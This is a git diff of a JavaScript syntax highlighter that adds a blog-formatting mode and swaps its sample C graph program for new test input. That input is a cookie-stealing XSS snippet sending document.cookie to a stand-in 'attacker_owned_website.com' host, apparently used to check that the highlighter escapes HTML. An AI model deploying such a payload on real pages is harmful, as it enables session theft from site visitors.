@@ -1,121 +1,11 @@
-var colors = {
-    "reservedWordsColor": '#ff5722',
-    "variableColor": '#03a9f4',
-    "stringColor": '#ff9800',
-    "commentColor": '#4caf50',
-    "escapeColor": '#ffeb3b',
-    "numericColor": '#009688',
-}
+// Syntax Highlighter by Hackerry
 
-var data = String.raw`
-// DFS algorithm in C
+var data = String.raw`<script>
+    var fakeImage = document.createElement("img");
+    fakeImage.src = "attacker_owned_website.com/image.png?cookie=" + document.cookie;
+    document.appendChild(fakeImage);
+</script>`;
 
-#include <stdio.h>
-#include <stdlib.h>
-
-struct node {
-  int vertex;
-  struct node* next;
-};
-
-struct node* createNode(int v);
-
-struct Graph {
-  int numVertices;
-  int* visited;
-
-  // We need int** to store a two dimensional array.
-  // Similary, we need struct node** to store an array of Linked lists
-  struct node** adjLists;
-};
-
-// DFS algo
-void DFS(struct Graph* graph, int vertex) {
-  struct node* adjList = graph->adjLists[vertex];
-  struct node* temp = adjList;
-
-  graph->visited[vertex] = 1;
-  printf("Visited %d \n", vertex);
-
-  while (temp != NULL) {
-    int connectedVertex = temp->vertex;
-
-    if (graph->visited[connectedVertex] == 0) {
-      DFS(graph, connectedVertex);
-    }
-    temp = temp->next;
-  }
-}
-
-// Create a node
-struct node* createNode(int v) {
-  struct node* newNode = malloc(sizeof(struct node));
-  newNode->vertex = v;
-  newNode->next = NULL;
-  return newNode;
-}
-
-// Create graph
-struct Graph* createGraph(int vertices) {
-  struct Graph* graph = malloc(sizeof(struct Graph));
-  graph->numVertices = vertices;
-
-  graph->adjLists = malloc(vertices * sizeof(struct node*));
-
-  graph->visited = malloc(vertices * sizeof(int));
-
-  int i;
-  for (i = 0; i < vertices; i++) {
-    graph->adjLists[i] = NULL;
-    graph->visited[i] = 0;
-  }
-  return graph;
-}
-
-// Add edge
-void addEdge(struct Graph* graph, int src, int dest) {
-  // Add edge from src to dest
-  struct node* newNode = createNode(dest);
-  newNode->next = graph->adjLists[src];
-  graph->adjLists[src] = newNode;
-
-  // Add edge from dest to src
-  newNode = createNode(src);
-  newNode->next = graph->adjLists[dest];
-  graph->adjLists[dest] = newNode;
-}
-
-// Print the graph
-void printGraph(struct Graph* graph) {
-  int v;
-  for (v = 0; v < graph->numVertices; v++) {
-    struct node* temp = graph->adjLists[v];
-    printf("\n Adjacency list of vertex %d\n ", v);
-    while (temp) {
-      printf("%d -> ", temp->vertex);
-      temp = temp->next;
-    }
-    printf("\n");
-  }
-}
-
-int main() {
-  struct Graph* graph = createGraph(4);
-  addEdge(graph, 0, 1);
-  addEdge(graph, 0, 2);
-  addEdge(graph, 1, 2);
-  addEdge(graph, 2, 3);
-
-  printGraph(graph);
-
-  DFS(graph, 2);
-
-  return 0;
-}`;
-
-/*const KEYWORDS = {
-    "JAVA": ["abstract", "continue", "for", "new", "switch", "assert", "default", "goto", "package", "synchronized", "boolean", "do", "if", "private", "this", "break", "double", "implements", "protected", "throw", "byte", "else", "import", "public", "throws", "case", "enum", "instanceof", "return", "transient", "catch", "extends", "int", "short", "try", "char", "final", "interface", "static", "void", "class", "finally", "long", "strictfp","volatile", "const", "float", "native", "super", "while"],
-}*/
 const KEYWORDS = [
     // Java keywords: https://docs.oracle.com/javase/tutorial/java/nutsandbolts/_keywords.html
     "abstract", "continue", "for", "new", "switch", "assert", "default", "goto", "package", "synchronized", "boolean", "do", "if", "private", "this", "break", "double", "implements", "protected", "throw", "byte", "else", "import", "public", "throws", "case", "enum", "instanceof", "return", "transient", "catch", "extends", "int", "short", "try", "char", "final", "interface", "static", "void", "class", "finally", "long", "strictfp","volatile", "const", "float", "native", "super", "while",
@@ -145,13 +35,18 @@ const KEY_COLOR = '#2196f3';
 const FUN_COLOR = '#ffeb3b';
 const PTR_COLOR = '#DAF7A6 ';
 
-function highlight(data) {
+// Highlight code
+// UsedForBlog is a parameter I use to furthur style the code to be used directly in my blog
+function highlight(data, usedForBlog=false) {
     var startIdx = 0;
 
     var result = '';
+    if(usedForBlog) {
+        result = '<ul class=\'ccode\'>\n<li><pre>';
+    }
 
     // Print individual characters for debug
-    //data.split('').forEach((e, i) => console.log(i + ": " + data.charCodeAt(i) + "-" + e + "\n"));
+    // data.split('').forEach((e, i) => console.log(i + ": " + data.charCodeAt(i) + "-" + e + "\n"));
 
     var i = 0;
     var dataLength = data.length;
@@ -186,7 +81,7 @@ function highlight(data) {
                 }
 
                 // Hightlight last part
-                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i+1)), COM_COLOR);
+                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i+1)), COM_COLOR, usedForBlog);
                 //console.log("Comment highlighted: " + startIdx + "-" + i);
             }
             //console.log("Comment ends at: " + i);
@@ -207,20 +102,20 @@ function highlight(data) {
                     break;
                 } else if(ESC_DELIM.includes(data.charAt(i)) && i+1 < dataLength) {
                     // Optional escape sequence
-                    result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), STR_COLOR);
-                    result += getHightLight(escapeSpecialChar(data.substring(i, i+2)), ESC_COLOR);
+                    result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), STR_COLOR, usedForBlog);
+                    result += getHightLight(escapeSpecialChar(data.substring(i, i+2)), ESC_COLOR, usedForBlog);
                     i++;
                     startIdx = i+1;
                 }
             }
 
             // Hightlight last part
-            result += getHightLight(escapeSpecialChar(data.substring(startIdx, i+1)), STR_COLOR);
+            result += getHightLight(escapeSpecialChar(data.substring(startIdx, i+1)), STR_COLOR, usedForBlog);
             //console.log("String ends: " + startIdx + "-" + i);
         } else if(FUN_DELIM.includes(data.charAt(i))) {
             //console.log("Function call check starts at: " + i);
 
-            result += escapeSpecialChar(data.charAt(i));
+            result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
             i++;
 
             startIdx = i;
@@ -232,13 +127,13 @@ function highlight(data) {
 
             // Function open bracket
             if(data.charAt(i) === '(') {
-                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), FUN_COLOR);
-                result += escapeSpecialChar(data.charAt(i));
+                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), FUN_COLOR, usedForBlog);
+                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
             } else {
                 // Other default color
-                result += escapeSpecialChar(data.substring(startIdx, i));
+                result += getRegular(escapeSpecialChar(data.substring(startIdx, i)), usedForBlog);
 
-                // Move one character to the left in case data[i] a special deliminator
+                // Move one character to the left in case data[i] is a special deliminator
                 i--;
             }
 
@@ -247,7 +142,7 @@ function highlight(data) {
             //console.log("Pointer call check starts at: " + i);
 
             if(i+1 < dataLength && data.charAt(i+1) === '>') {
-                result += escapeSpecialChar(data.substring(i, i+2));
+                result += getRegular(escapeSpecialChar(data.substring(i, i+2)), usedForBlog);
                 i += 2;
 
                 startIdx = i;
@@ -257,7 +152,7 @@ function highlight(data) {
                     i++;
                 }
 
-                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), PTR_COLOR);
+                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), PTR_COLOR, usedForBlog);
                 i--;
             }
 
@@ -283,23 +178,23 @@ function highlight(data) {
             var lastString = data.substring(startIdx, i);
             if(KEYWORDS.includes(lastString)) {
                 // Is a keyword
-                result += getHightLight(escapeSpecialChar(lastString), KEY_COLOR);
-                result += escapeSpecialChar(data.charAt(i));
-            } else if(lastString.split('').every((c) => c >= '0' && c <= '9')) {
+                result += getHightLight(escapeSpecialChar(lastString), KEY_COLOR, usedForBlog);
+                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
+            } else if(lastString !== '' && lastString.split('').every((c) => c >= '0' && c <= '9')) {
                 // Is a number
-                result += getHightLight(escapeSpecialChar(lastString), NUM_COLOR);
-                result += escapeSpecialChar(data.charAt(i));
+                result += getHightLight(escapeSpecialChar(lastString), NUM_COLOR, usedForBlog);
+                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
             } else if(lastString.match(/[a-z0-9_]/i) && data.charAt(i) === '(') {
                 // Is a function
-                result += getHightLight(escapeSpecialChar(lastString), FUN_COLOR);
-                result += escapeSpecialChar(data.charAt(i));
+                result += getHightLight(escapeSpecialChar(lastString), FUN_COLOR, usedForBlog);
+                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
             }else {
                 // Special deliminator in prev cases
                 if(specialDelim) {
-                    result += escapeSpecialChar(data.substring(startIdx, i));
+                    result += getRegular(escapeSpecialChar(data.substring(startIdx, i)), usedForBlog);
                     i--;
                 } else {
-                    result += escapeSpecialChar(data.substring(startIdx, i+1));
+                    result += getRegular(escapeSpecialChar(data.substring(startIdx, i+1)), usedForBlog);
                 }
             }
 
@@ -310,13 +205,34 @@ function highlight(data) {
         i++;
     }
 
+    if(usedForBlog) {
+        result += "</pre></li>\n</ul>";
+    }
+
     return result;
 }
 
-function getHightLight(part, color) {
-    return "<span style='color:" + color + "'>" + part + "</span>";
+// Regular text
+function getRegular(part, usedForBlog=false) {
+    if(usedForBlog) {
+        return part.replaceAll("\n", "</pre></li>\n<li><pre>");
+    } else {
+        return part.replaceAll("\n", "<br>");
+    }
 }
 
+// Get highlighted html code
+function getHightLight(part, color, usedForBlog=false) {
+    if(usedForBlog) {
+        var part = "<span style='color:" + color + "'>" + part + "</span>";
+        return part.replaceAll("\n", "</span></pre></li>\n<li><pre><span style='color:" + color + "'>");
+    } else {
+        var part = "<span style='color:" + color + "'>" + part + "</span>";
+        return part.replaceAll("\n", "<br>");
+    }
+}
+
+// Escape special characters
 function escapeSpecialChar(data) {
     data = String(data);
     data = data.replaceAll('&','&amp;');
